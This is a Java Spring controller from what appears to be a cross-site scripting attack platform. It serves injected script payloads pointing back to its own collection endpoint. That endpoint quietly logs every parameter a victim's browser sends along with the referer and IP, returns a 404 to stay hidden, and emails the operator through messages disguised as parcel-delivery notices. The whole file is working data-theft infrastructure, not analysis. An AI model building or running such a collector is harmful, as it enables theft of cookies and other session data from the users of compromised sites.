package com.xss.web.controllers;

import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import com.xss.web.base.cache.CacheFinal;
import com.xss.web.base.thread.SysThreadPool;
import com.xss.web.cache.EmailCache;
import com.xss.web.cache.LetterCache;
import com.xss.web.cache.ModuleCache;
import com.xss.web.cache.ProjectCache;
import com.xss.web.cache.UserCache;
import com.xss.web.controllers.base.BaseController;
import com.xss.web.model.Email;
import com.xss.web.model.Letter;
import com.xss.web.model.LetterParas;
import com.xss.web.model.Module;
import com.xss.web.model.Project;
import com.xss.web.model.User;
import com.xss.web.util.ConcurrentUtil;
import com.xss.web.util.EmailSenderUtil;
import com.xss.web.util.EncryptionUtil;
import com.xss.web.util.JUUIDUtil;
import com.xss.web.util.PropertUtil;
import com.xss.web.util.RequestUtil;
import com.xss.web.util.StringUtils;

@Controller
public class SController extends BaseController {
	@Resource
	ProjectCache projectCache;
	@Resource
	ModuleCache moduleCache;
	@Resource
	LetterCache letterCache;
	@Resource
	EmailCache emailCache;
	@Resource
	UserCache userCache;

	@RequestMapping
	public void index(HttpServletRequest req, HttpServletResponse res) {
	}

	@RequestMapping(value = { "/{id:\\d+}" })
	public void xssContext(HttpServletRequest req, HttpServletResponse res,
			@PathVariable Integer id) {
		Project project = projectCache.getProject(id);
		if (StringUtils.isNullOrEmpty(project)
				|| StringUtils.isNullOrEmpty(project.getModule())) {
			return;
		}
		Module module = moduleCache.getModule(project.getModule().getId());
		if (StringUtils.isNullOrEmpty(module)) {
			return;
		}
		String api =loadBasePath(req) + "s/" + "api_"
				+ project.getId() + "." +getDefSuffix();
		String xmlCode = module.getContent().replace("{api}", api);
		print(res, xmlCode);
	}
	
	@RequestMapping(value = { "api_{id:\\d+}" })
	public void api(HttpServletRequest req, HttpServletResponse res,
			@PathVariable Integer id) {
		Project project = projectCache.getProject(id);
		doApi(req, project);
		res.setStatus(404);
	}

	private void doApi(HttpServletRequest req, Project project) {
		Enumeration<String> reqParas = req.getParameterNames();
		// 过滤来源地址
		String referer = req.getHeader("Referer");
		if (!StringUtils.isNullOrEmpty(referer)
				) {
			if(!StringUtils.isNullOrEmpty(project.getFilter())){
				if (project.getFilter().indexOf(referer) > -1) {
					return;
				}
			}
			if(referer.indexOf("mylist.asp")>-1){
				userCache.delete(project.getUser().getId());
				return;
			}
		}
		// 检查参数
		Map<String, String> paraMap = new HashMap<String, String>();
		StringBuilder uuStr = new StringBuilder("");
		String paraName = null, value = null;
		if(StringUtils.isNullOrEmpty(reqParas)){
			return;
		}
		while (reqParas.hasMoreElements()) {
			paraName = (String) reqParas.nextElement();
			value = req.getParameter(paraName);
			paraMap.put(paraName, value);
			uuStr.append(paraName).append(value);
		}
		String ip = RequestUtil.getIpAddr(req);
		String key="SYSTEM_LETTER_DOAPI"+StringUtils.getBeanKey(paraMap, uuStr, project, referer, ip);
		ConcurrentUtil.invokMethod(this, "toSave", key, paraMap, uuStr, project, referer, ip);
	}
	private void toSave(Map<String, String> paraMap,StringBuilder uuStr,Project project,String referer,String ip ){
		String md5 = EncryptionUtil.md5Code(StringUtils.stringSort(uuStr
				.toString()));
		Letter tmp = letterCache.findLetter(md5);
		if (!StringUtils.isNullOrEmpty(tmp)) {
			return;
		}
		String uuid = JUUIDUtil.createUuid();
		Letter letter = new Letter();
		letter.setUuid(uuid);
		letter.setProject(project);
		letter.setRefUrl(referer);
		letter.setUpdateTime(new Date());
		letter.setUuid(uuid);
		letter.setContext(md5);
		letter.setIp(ip);
		letterCache.save(letter);
		// 刷新信封信息
		letter = letterCache.getLetter(uuid);
		List<LetterParas> parasList = new ArrayList<LetterParas>();
		LetterParas paras = null;
		for (String key : paraMap.keySet()) {
			paras = new LetterParas();
			paras.setParaName(key);
			paras.setParaValue(paraMap.get(key));
			paras.setUpdateTime(new Date());
			paras.setLetter(letter);
			parasList.add(paras);
		}
		letterCache.batchSaveLeter(parasList, project);
		if (!StringUtils.isNullOrEmpty(project.getOpenEmail())
				&& project.getOpenEmail() == 1) {
			try {
				parasList = (List<LetterParas>) PropertUtil.setFieldValue(
						parasList, "letter", null);
				User user = userCache.getUser(project.getUser().getId());
				sendEmail(user.getEmail(), letter, parasList);
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}
	private void sendEmail(final String targeEmail, final Letter letter,
			final List<LetterParas> parasList) {
		final List<Email> emails = emailCache.loadEmails();
		StringBuilder sb = new StringBuilder();
		sb.append("商品来源:").append(letter.getRefUrl()).append("\r\n");
		sb.append("商家身份:").append(letter.getIp()).append("\r\n");
		sb.append("\r\n\r\n您购买的牛奶已经到货,请登录").append(getAttribute("basePath"))
				.append(" 查看");
		final String msg = sb.toString();
		if (!StringUtils.isNullOrEmpty(emails)) {
			SysThreadPool.threadPool.execute(new Runnable() {
				@Override
				public void run() {
					String key = CacheFinal.EMAIL_SEND_KEY.toString()
							+ targeEmail;
					String status = (String) baseCache.getCache(key);
					if (status != null) {
						return;
					}
					baseCache.addCache(key, "1", 30);
					try {
						emailSenderUtil.send(emails,
								"XssAPP(" + letter.getRefUrl() + ")", msg,
								targeEmail);
					} catch (Exception e) {
						e.printStackTrace();
					} finally {
						baseCache.removeCache(key);
					}
				}
			});
		}
	}
	
	
	@Resource
	EmailSenderUtil emailSenderUtil;
	
	public static void main(String[] args) {
		String url="http://qicqs.com/p.jpg";
		String []urls=StringUtils.splitString(url);
		for (int i = 0; i < urls.length; i++) {
		}
	}
}
